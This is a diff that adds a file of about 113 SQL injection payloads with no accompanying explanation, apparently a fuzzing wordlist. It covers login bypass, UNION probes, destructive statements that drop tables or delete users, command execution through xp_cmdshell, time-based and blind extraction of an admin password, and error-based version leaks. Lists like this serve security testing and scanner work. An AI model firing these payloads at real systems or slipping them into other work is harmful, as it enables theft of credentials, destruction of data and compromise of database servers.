@@ -1,0 +1,113 @@
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR '1'='1--
+') OR ('1'='1--
+' OR 1=1 LIMIT 1--
+' OR 1=1 ORDER BY 1--
+' OR 1=1 GROUP BY 1--
+' OR 1=1 HAVING 1=1--
+' UNION SELECT 1--
+' UNION SELECT NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT 1--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT 1,2,3--
+' UNION ALL SELECT NULL,NULL,NULL--
+'; DROP TABLE users--
+'; DROP DATABASE test--
+'; DELETE FROM users--
+'; DELETE FROM users WHERE 1=1--
+'; UPDATE users SET password='hacked'--
+'; INSERT INTO users VALUES('hacker','pass')--
+'; EXEC xp_cmdshell('dir')--
+'; EXEC sp_configure 'show advanced options',1--
+'; SHUTDOWN--
+'; WAITFOR DELAY '00:00:05'--
+'; IF (1=1) WAITFOR DELAY '00:00:05'--
+'; BENCHMARK(5000000,MD5(1))--
+'; SELECT SLEEP(5)--
+'; SELECT pg_sleep(5)--
+'; SELECT DBMS_LOCK.SLEEP(5) FROM dual--
+' AND (SELECT COUNT(*) FROM users) > 0--
+' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--
+' AND (SELECT COUNT(*) FROM sys.tables) > 0--
+' AND (SELECT COUNT(*) FROM mysql.user) > 0--
+' AND (SELECT COUNT(*) FROM pg_user) > 0--
+' AND (SELECT COUNT(*) FROM all_users) > 0--
+' AND (SELECT SUBSTRING(@@version,1,1)) = '5'--
+' AND (SELECT SUBSTRING(version(),1,1)) = '5'--
+' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE 'Oracle%'--
+' AND (SELECT version()) LIKE 'PostgreSQL%'--
+' AND (SELECT sqlite_version()) LIKE '3%'--
+' AND (SELECT @@version) LIKE 'Microsoft%'--
+' AND (SELECT user()) = 'root'--
+' AND (SELECT current_user()) = 'root'--
+' AND (SELECT system_user()) = 'root'--
+' AND (SELECT session_user()) = 'root'--
+' AND (SELECT user) = 'root'--
+' AND (SELECT current_user) = 'root'--
+' AND (SELECT getpgusername()) = 'postgres'--
+' AND (SELECT user FROM dual) = 'SYSTEM'--
+' AND (SELECT database()) = 'test'--
+' AND (SELECT db_name()) = 'test'--
+' AND (SELECT current_database()) = 'test'--
+' AND (SELECT name FROM master..sysdatabases WHERE dbid=1) = 'master'--
+' AND (SELECT schema_name FROM information_schema.schemata LIMIT 1) = 'information_schema'--
+' AND (SELECT table_name FROM information_schema.tables LIMIT 1) = 'users'--
+' AND (SELECT column_name FROM information_schema.columns LIMIT 1) = 'id'--
+' AND (SELECT name FROM sysobjects WHERE xtype='U' LIMIT 1) = 'users'--
+' AND (SELECT name FROM syscolumns WHERE id=OBJECT_ID('users') LIMIT 1) = 'id'--
+' AND (SELECT tbl_name FROM sqlite_master WHERE type='table' LIMIT 1) = 'users'--
+' AND (SELECT sql FROM sqlite_master WHERE type='table' AND name='users') LIKE '%password%'--
+' AND (SELECT relname FROM pg_class WHERE relkind='r' LIMIT 1) = 'users'--
+' AND (SELECT attname FROM pg_attribute WHERE attrelid=OID('users') LIMIT 1) = 'id'--
+' AND (SELECT table_name FROM user_tables WHERE rownum=1) = 'USERS'--
+' AND (SELECT column_name FROM user_tab_columns WHERE table_name='USERS' AND rownum=1) = 'ID'--
+' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 64--
+' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) < 91--
+' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) = 65--
+' AND UNICODE(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) = 65--
+' AND ORD(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) = 65--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%') = 1--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'ad%') = 1--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'adm%') = 1--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password REGEXP '^a') = 1--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password REGEXP '^ad') = 1--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password REGEXP '^adm') = 1--
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) = 1--
+' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END) = 0--
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN 1 ELSE 0 END) = 1--
+' AND (SELECT IIF(1=1,1,0)) = 1--
+' AND (SELECT IIF(1=2,1,0)) = 0--
+' AND (SELECT IIF((SELECT COUNT(*) FROM users) > 0,1,0)) = 1--
+' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())--
+' AND 1=(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())--
+' AND 1=(SELECT COUNT(*) FROM mysql.user)--
+' AND 1=(SELECT COUNT(*) FROM pg_user)--
+' AND 1=(SELECT COUNT(*) FROM all_users)--
+' AND 1=(SELECT COUNT(*) FROM sys.tables)--
+' AND 1=(SELECT COUNT(*) FROM sysobjects WHERE xtype='U')--
+' AND 1=(SELECT COUNT(*) FROM sqlite_master WHERE type='table')--
+' AND 1=(SELECT COUNT(*) FROM pg_class WHERE relkind='r')--
+' AND 1=(SELECT COUNT(*) FROM user_tables)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
+' AND EXP(~(SELECT * FROM (SELECT version())x))--
+' AND GTID_SUBSET(version(),1)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))--
+' AND (SELECT * FROM (SELECT version())x WHERE 1=1)--
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND ROW(1,1) > (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--
+' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)--
+' AND (SELECT * FROM (SELECT * FROM (SELECT version())a JOIN (SELECT version())b)c)--
+' AND (SELECT * FROM (SELECT * FROM (SELECT version())a JOIN (SELECT version())b USING(version))c)--
+' AND POLYGON((SELECT * FROM (SELECT version())x))--
+' AND LINESTRING((SELECT * FROM (SELECT version())x))--
+' AND MULTIPOINT((SELECT * FROM (SELECT version())x))--
+' AND MULTILINESTRING((SELECT * FROM (SELECT version())x))--
+' AND MULTIPOLYGON((SELECT * FROM (SELECT version())x))--
+' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT version())x))--
